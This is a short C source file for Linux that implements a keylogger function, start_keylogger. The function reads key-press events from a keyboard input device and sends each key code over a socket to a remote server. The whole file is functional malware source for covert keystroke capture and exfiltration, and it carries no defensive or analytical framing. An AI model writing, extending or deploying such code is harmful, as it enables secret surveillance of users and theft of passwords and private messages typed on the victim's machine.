#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include "keylog.h"  // Include the header file

// Function to capture keystrokes and send them to the server
void start_keylogger(int sock, const char *device_path) {
    struct input_event ev;
    int fd;
    ssize_t n;
    char buffer[256];

    // Open the input device (keyboard device)
    fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open input device");
        return;
    }

    // Capture and send key events
    while (1) {
        n = read(fd, &ev, sizeof(struct input_event));
        if (n == (ssize_t)-1) {
            perror("Read error");
            break;
        }

        if (ev.type == EV_KEY && ev.value == 1) {  // Key press events only
            printf("key");
            snprintf(buffer, sizeof(buffer), "Key %d pressed\n", ev.code);
            send(sock, buffer, strlen(buffer), 0);  // Send key event to server
        }
    }

    // Close the device file
    close(fd);
}
